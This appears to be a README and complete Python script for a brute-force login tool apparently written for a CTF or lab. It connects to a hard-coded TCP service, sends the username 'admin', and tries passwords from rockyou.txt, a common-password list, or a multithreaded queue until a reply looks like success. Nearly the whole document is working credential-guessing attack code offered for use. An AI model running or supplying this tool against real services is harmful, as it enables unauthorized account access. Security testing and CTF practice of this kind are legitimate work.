# Python Login Brute Force Tester

A Python authentication testing tool for custom TCP/HTTP services. It automates login attempts by sending a username, waiting for a password prompt, testing passwords from a wordlist, and analyzing responses for successful authentication.

### Features:

* Wordlist password testing
* Common password checks
* Interactive testing
* Multi-threaded attempts

**Flow:**

```
admin → Password: → password → response check
```

Built for authorized security testing and CTF environments.


```
import socket
import time
import re
from colorama import init, Fore, Style
import os
import sys

# Initialize colorama
init(autoreset=True)

# Target configuration
TARGET_IP = "10.81.134.250"
TARGET_PORT = 8000
WORDLIST_PATH = "/media/guest/D/cyber/rockyou.txt"

class PythonHTTPServerBrute:
    def __init__(self):
        self.target_ip = TARGET_IP
        self.target_port = TARGET_PORT
        self.found_password = None
        
    def attempt_login(self, password, timeout=5):
        """
        Complete login sequence:
        1. Send "admin"
        2. Wait for "Password:" prompt
        3. Send the password
        4. Check response
        """
        try:
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((self.target_ip, self.target_port))
            
            # Step 1: Send "admin"
            sock.send(b"admin\n")
            
            # Step 2: Wait for "Password:" prompt
            response = b""
            start_time = time.time()
            while time.time() - start_time < 2:
                try:
                    chunk = sock.recv(1024)
                    if chunk:
                        response += chunk
                        # Check if we got "Password:" prompt
                        if b"Password:" in chunk or b"password:" in chunk.lower():
                            break
                except socket.timeout:
                    break
            
            # Step 3: Send the password
            if isinstance(password, str):
                password = password.encode('utf-8')
            sock.send(password + b'\n')
            
            # Step 4: Get final response
            final_response = b""
            start_time = time.time()
            while time.time() - start_time < 3:
                try:
                    chunk = sock.recv(4096)
                    if chunk:
                        final_response += chunk
                        # If we get "Password:" again, it means login failed
                        if b"Password:" in chunk:
                            break
                    else:
                        break
                except socket.timeout:
                    break
            
            sock.close()
            
            # Decode response
            response_str = final_response.decode('utf-8', errors='ignore')
            
            # Check if login was successful
            # If we get "Password:" prompt again, it failed
            if "Password:" in response_str or "password:" in response_str.lower():
                return False, None, response_str
            
            # Check for success indicators
            success_indicators = [
                "success", "welcome", "authenticated", "logged in",
                "valid", "correct", "granted", "access", "approved",
                "done", "ok", "true", "yes", "allowed", "accepted",
                "shell", "cmd", "prompt", ">", "#", "$"
            ]
            
            # If we got any response and it doesn't contain "Password:" again
            if response_str and len(response_str.strip()) > 0:
                # Check for success indicators
                for indicator in success_indicators:
                    if indicator.lower() in response_str.lower():
                        return True, password, response_str
                
                # If response is not a password prompt, might be success
                if "Password:" not in response_str:
                    return True, password, response_str
            
            return False, None, response_str
            
        except socket.timeout:
            return False, None, "Timeout"
        except ConnectionRefusedError:
            return False, None, "Connection refused"
        except Exception as e:
            return False, None, f"Error: {e}"
    
    def test_connection(self):
        """Test the login flow and understand server behavior"""
        print(f"{Fore.CYAN}[*] Testing connection to {self.target_ip}:{self.target_port}...")
        
        # Test with wrong password first
        success, found, response = self.attempt_login("wrongpassword")
        
        if "Connection refused" in response:
            print(f"{Fore.RED}[-] Server not running or port not open")
            return False
        elif "Timeout" in response:
            print(f"{Fore.RED}[-] Server not responding")
            return False
        else:
            print(f"{Fore.GREEN}[+] Server is reachable!")
            print(f"{Fore.YELLOW}[*] Login flow detected:")
            print(f"{Fore.YELLOW}    1. Send 'admin'")
            print(f"{Fore.YELLOW}    2. Wait for 'Password:' prompt")
            print(f"{Fore.YELLOW}    3. Send password")
            print(f"{Fore.YELLOW}    4. If failed, get 'Password:' prompt again")
            print(f"{Fore.YELLOW}[*] Test response with 'wrongpassword':")
            print(f"{Fore.YELLOW}{response[:200]}")
            return True
    
    def brute_force_streaming(self, max_passwords=None):
        """Stream passwords from rockyou.txt and test them"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}BRUTE FORCE - Login Sequence")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}[*] Target: {self.target_ip}:{self.target_port}")
        print(f"{Fore.CYAN}[*] Sequence:")
        print(f"{Fore.CYAN}    1. Send: admin")
        print(f"{Fore.CYAN}    2. Wait for: Password:")
        print(f"{Fore.CYAN}    3. Send: <password>")
        print(f"{Fore.CYAN}[*] Wordlist: {WORDLIST_PATH}")
        
        # Check wordlist exists
        if not os.path.exists(WORDLIST_PATH):
            print(f"{Fore.RED}[-] Wordlist not found: {WORDLIST_PATH}")
            print(f"{Fore.YELLOW}[!] Creating a sample wordlist...")
            self.create_sample_wordlist()
            return
        
        # Check connection
        if not self.test_connection():
            return
        
        print(f"{Fore.CYAN}[*] Starting brute force...\n")
        
        count = 0
        found = False
        start_time = time.time()
        
        try:
            with open(WORDLIST_PATH, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    if not password:
                        continue
                    
                    count += 1
                    
                    # Check if we've reached the limit
                    if max_passwords and count > max_passwords:
                        print(f"{Fore.YELLOW}[*] Reached password limit ({max_passwords})")
                        break
                    
                    # Show progress
                    if count % 50 == 0:
                        elapsed = time.time() - start_time
                        rate = count / elapsed if elapsed > 0 else 0
                        print(f"{Fore.YELLOW}[*] Tried {count} passwords ({rate:.1f}/s)... Current: {password}")
                    
                    # Try the password
                    success, found_pwd, response = self.attempt_login(password)
                    
                    if success:
                        elapsed = time.time() - start_time
                        print(f"\n{Fore.GREEN}{'='*60}")
                        print(f"{Fore.GREEN}[+] SUCCESS! Password found: {found_pwd}")
                        print(f"{Fore.GREEN}[+] Server response: {response[:300]}")
                        print(f"{Fore.GREEN}[+] Attempts: {count}")
                        print(f"{Fore.GREEN}[+] Time elapsed: {elapsed:.1f} seconds")
                        print(f"{Fore.GREEN}{'='*60}")
                        self.found_password = found_pwd
                        found = True
                        break
                    
                    # Small delay
                    time.sleep(0.05)
            
            if not found:
                elapsed = time.time() - start_time
                print(f"\n{Fore.RED}[-] Password not found in {count} attempts")
                print(f"{Fore.RED}[-] Time elapsed: {elapsed:.1f} seconds")
                
        except KeyboardInterrupt:
            elapsed = time.time() - start_time
            print(f"\n{Fore.YELLOW}[!] Brute force interrupted by user")
            print(f"{Fore.YELLOW}[*] Tried {count} passwords in {elapsed:.1f} seconds")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}")
    
    def brute_force_threaded(self, max_passwords=1000):
        """Threaded brute force with a subset of passwords"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}THREADED BRUTE FORCE")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}[*] Target: {self.target_ip}:{self.target_port}")
        print(f"{Fore.CYAN}[*] Login sequence: admin -> Password: -> <password>")
        
        # Load passwords
        passwords = []
        try:
            with open(WORDLIST_PATH, 'r', encoding='utf-8', errors='ignore') as f:
                for i, line in enumerate(f):
                    if i >= max_passwords:
                        break
                    pwd = line.strip()
                    if pwd:
                        passwords.append(pwd)
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading wordlist: {e}")
            return
        
        print(f"{Fore.CYAN}[*] Loaded {len(passwords)} passwords")
        print(f"{Fore.CYAN}[*] Using 15 threads\n")
        
        # Check connection
        if not self.test_connection():
            return
        
        # Threaded attack
        found_flag = False
        start_time = time.time()
        
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = {}
            for pwd in passwords:
                futures[executor.submit(self.attempt_login, pwd)] = pwd
            
            for i, future in enumerate(as_completed(futures), 1):
                pwd = futures[future]
                success, found_pwd, response = future.result()
                
                if success:
                    elapsed = time.time() - start_time
                    print(f"\n{Fore.GREEN}{'='*60}")
                    print(f"{Fore.GREEN}[+] SUCCESS! Password found: {found_pwd}")
                    print(f"{Fore.GREEN}[+] Server response: {response[:300]}")
                    print(f"{Fore.GREEN}[+] Attempts: {i}")
                    print(f"{Fore.GREEN}[+] Time elapsed: {elapsed:.1f} seconds")
                    print(f"{Fore.GREEN}{'='*60}")
                    self.found_password = found_pwd
                    executor.shutdown(wait=False)
                    found_flag = True
                    break
                
                if i % 100 == 0 or i == len(passwords):
                    elapsed = time.time() - start_time
                    rate = i / elapsed if elapsed > 0 else 0
                    print(f"{Fore.YELLOW}[*] Tried {i}/{len(passwords)} passwords ({rate:.1f}/s)...")
        
        if not found_flag:
            elapsed = time.time() - start_time
            print(f"\n{Fore.RED}[-] Password not found in {len(passwords)} attempts")
            print(f"{Fore.RED}[-] Time elapsed: {elapsed:.1f} seconds")
    
    def interactive_test(self):
        """Interactive mode to test passwords manually"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}INTERACTIVE TEST MODE")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}[!] The server will prompt:")
        print(f"{Fore.YELLOW}    admin")
        print(f"{Fore.YELLOW}    Password:")
        print(f"{Fore.YELLOW}[!] Type a password to test, or 'quit' to exit\n")
        
        while True:
            try:
                pwd = input(f"{Fore.CYAN}[?] Password to test: ").strip()
                
                if pwd.lower() in ['quit', 'exit', 'q']:
                    break
                
                if not pwd:
                    continue
                
                print(f"{Fore.YELLOW}[*] Testing password: {pwd}")
                success, found_pwd, response = self.attempt_login(pwd)
                
                if success:
                    print(f"{Fore.GREEN}[+] SUCCESS! Password works!")
                    print(f"{Fore.GREEN}[+] Response: {response}")
                else:
                    print(f"{Fore.RED}[-] Password failed")
                    print(f"{Fore.RED}[-] Response: {response[:200]}")
                print()
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {e}")
    
    def quick_test_list(self):
        """Test a small list of common passwords quickly"""
        common_passwords = [
            "password", "123456", "admin", "admin123", "root",
            "toor", "letmein", "qwerty", "abc123", "monkey",
            "12345678", "1234", "password123", "welcome", "login",
            "test", "test123", "passw0rd", "p@ssw0rd", "12345",
            "iloveyou", "dragon", "master", "sunshine", "hello"
        ]
        
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}QUICK SCAN - 25 Common Passwords")
        print(f"{Fore.CYAN}{'='*60}")
        
        # Check connection
        if not self.test_connection():
            return
        
        print(f"{Fore.CYAN}[*] Testing {len(common_passwords)} common passwords...\n")
        
        count = 0
        for pwd in common_passwords:
            count += 1
            print(f"{Fore.YELLOW}[*] Testing {count}/{len(common_passwords)}: {pwd}")
            
            success, found_pwd, response = self.attempt_login(pwd)
            
            if success:
                print(f"\n{Fore.GREEN}{'='*60}")
                print(f"{Fore.GREEN}[+] SUCCESS! Password found: {found_pwd}")
                print(f"{Fore.GREEN}[+] Server response: {response[:300]}")
                print(f"{Fore.GREEN}{'='*60}")
                self.found_password = found_pwd
                return
            
            time.sleep(0.05)
        
        print(f"\n{Fore.RED}[-] Password not found in common passwords list")
    
    def create_sample_wordlist(self):
        """Create a sample wordlist if rockyou.txt doesn't exist"""
        common_passwords = [
            "password", "123456", "12345678", "1234", "qwerty",
            "abc123", "monkey", "letmein", "dragon", "111111",
            "baseball", "iloveyou", "trustno1", "sunshine", "master",
            "hello", "cookie", "whatever", "admin", "admin123",
            "root", "toor", "password123", "welcome", "login",
            "passw0rd", "p@ssw0rd", "1q2w3e4r", "12345", "000000"
        ]
        
        filename = "sample_wordlist.txt"
        with open(filename, 'w') as f:
            for pwd in common_passwords:
                f.write(pwd + "\n")
        
        print(f"{Fore.GREEN}[+] Sample wordlist created: {filename}")
        return filename
    
    def auto_brute(self):
        """Auto-detect the best approach and start brute forcing"""
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}AUTO BRUTE FORCE")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}[*] Login flow detected:")
        print(f"{Fore.CYAN}    admin")
        print(f"{Fore.CYAN}    Password:")
        print(f"{Fore.CYAN}    If failed: Password: (repeats)")
        print(f"{Fore.CYAN}{'='*60}")
        
        print(f"\n{Fore.YELLOW}[!] Choose attack method:")
        print(f"{Fore.YELLOW}1. Quick scan - 25 most common passwords")
        print(f"{Fore.YELLOW}2. Fast test - First 1000 passwords from rockyou.txt (threaded)")
        print(f"{Fore.YELLOW}3. Full attack - All passwords from rockyou.txt (streaming)")
        print(f"{Fore.YELLOW}4. Interactive - Manual testing")
        
        choice = input(f"{Fore.CYAN}[?] Enter choice (1-4): ").strip()
        
        if choice == "1":
            self.quick_test_list()
        elif choice == "2":
            self.brute_force_threaded(max_passwords=1000)
        elif choice == "3":
            self.brute_force_streaming()
        elif choice == "4":
            self.interactive_test()
        else:
            print(f"{Fore.RED}[-] Invalid choice. Using quick scan...")
            self.quick_test_list()

# Main execution
if __name__ == "__main__":
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}Python HTTP Server Brute Forcer")
    print(f"{Fore.CYAN}Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"{Fore.CYAN}Wordlist: {WORDLIST_PATH}")
    print(f"{Fore.CYAN}{'='*60}")
    
    brute = PythonHTTPServerBrute()
    
    try:
        brute.auto_brute()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Program interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[-] Fatal error: {e}")
        sys.exit(1)
```
